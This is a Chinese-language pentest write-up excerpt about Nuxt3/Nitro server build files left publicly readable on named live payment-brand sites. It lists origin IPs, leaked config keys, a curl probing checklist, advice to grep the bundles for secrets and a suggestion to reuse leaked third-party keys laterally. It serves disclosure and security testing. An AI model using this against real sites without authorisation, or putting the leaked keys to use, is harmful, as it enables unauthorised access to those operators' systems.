# Nuxt3/Nitro 服务端构建产物源码泄露 — xinbi.com 实战

> 来源：xinbi.com 20 阶段全链渗透报告 P4-02 / P8-02

## 漏洞

Nuxt3 应用的 **Nitro 服务端构建产物**（`.output/server/`）直接通过 Web 访问公开。

## 泄露路径

```
GET /server/index.mjs                          → 200  2,689 B    Nitro 服务端入口
GET /server/chunks/nitro/nitro.mjs            → 200  257,254 B  完整 Nitro 运行时+配置
GET /server/chunks/nitro/nitro.mjs.map        → 200  13,391 B   Source Map
GET /server/chunks/_/error-500.mjs            → 200  5,135 B    错误处理
```

### 经 CDN 和源站直连均可读

```
# 经 Cloudflare
https://official-ui.xspay.vip/server/index.mjs → 200

# 经源站直连
http://126.214.108.58/server/index.mjs          → 200（Host: official-ui.xspay.vip）

# xinbipay.com 源站同样泄露
http://18.141.84.252/server/index.mjs           → 200
http://47.242.180.239/server/index.mjs          → 200
```

## 泄露内容

### Runtime Public Config
```json
{
  "siteUrl": "https://official-ui.xspay.vip",
  "apiBase": "",
  "apiBasePath": "api",
  "sourcemap": false,
  "openInstallAppKey": "xd0ydt",
  "livechatLicense": "19400635"
}
```

### 构建环境路径
```
file:///src/node_modules/.pnpm/h3@1.15.11/...   (official-ui 环境)
file:///_entry.js                                 (xinbipay 容器环境)
```

### Source Map 内容
- `nitro.mjs.map`（13,391 B）含 `i18n/zh-CN.ts`、`i18n/en.ts`、`i18n/zh-TW.ts` 源码映射
- `/_nuxt/*.js.map` 不存在（`sourcemap:false` 生效于前端，但未覆盖 `/server/`）

### 未发现的内容
- `process.env` 仅框架变量（无数据库/Redis/对象存储凭据）
- 无 API 密钥、无签名盐

## 同源判定

两个独立站点的 runtime config **完全一致**（`openInstallAppKey=xd0ydt`、`livechatLicense=19400635`）
→ `official-ui.xspay.vip` 与 `xinbipay.com` 是同一套 Nuxt 构建的两份部署。

而 `www.thpay.org`（同一运营方的第三个品牌站）：
- `/server/index.mjs` → SPA 兜底 200（非源码）
- 构建产物未泄露

## 对比 Next.js 泄露

| 维度 | Nuxt3/Nitro | Next.js |
|------|-------------|---------|
| 默认泄露路径 | `/server/index.mjs`、`/server/chunks/nitro/*.mjs` | `/_next/data/`、`/_next/static/` |
| Source Map | `/server/chunks/nitro/nitro.mjs.map` | `/_next/static/chunks/*.js.map` |
| 配置泄露 | `runtimeConfig` 内嵌在 `nitro.mjs` | `__NEXT_DATA__` 或 `next.config.js` 公开属性 |
| 修复 | nginx 屏蔽 `/server`、`/.output` | 屏蔽 `/_next/static/chunks/*.map` |

## Nuxt3/Nitro 完整检查清单

```bash
# 1. 服务端入口
curl -sI https://target/server/index.mjs

# 2. Nitro 运行时（最大文件，含全量配置）
curl -sI https://target/server/chunks/nitro/nitro.mjs

# 3. Source Map
curl -sI https://target/server/chunks/nitro/nitro.mjs.map

# 4. 错误处理（可能含栈追踪配置）
curl -sI https://target/server/chunks/_/error-500.mjs

# 5. .output 目录
curl -sI https://target/.output/server/index.mjs

# 6. 前端 Source Map（通常被 sourcemap:false 关闭）
curl -sI https://target/_nuxt/entry.*.js.map
```

## 测绘引擎适配

1. 遇到 Nuxt3 站点（`__NUXT__` / `/_nuxt/` / `/_payload.json`）→ 必须检查 `/server/` 路径
2. `nitro.mjs` 体积大（本案 257KB）→ 可能含敏感配置，grep `password/secret/key/token/database`
3. `runtimeConfig` 中的 `openInstallAppKey`、`livechatLicense` 等第三方密钥可横向利用
4. 同一构建产物部署在多个域名 → 可做同源判定
5. Nuxt3 的 SPA 兜底 200 会干扰路径枚举 → `/api`、`/admin` 返回 200 不代表端点存在
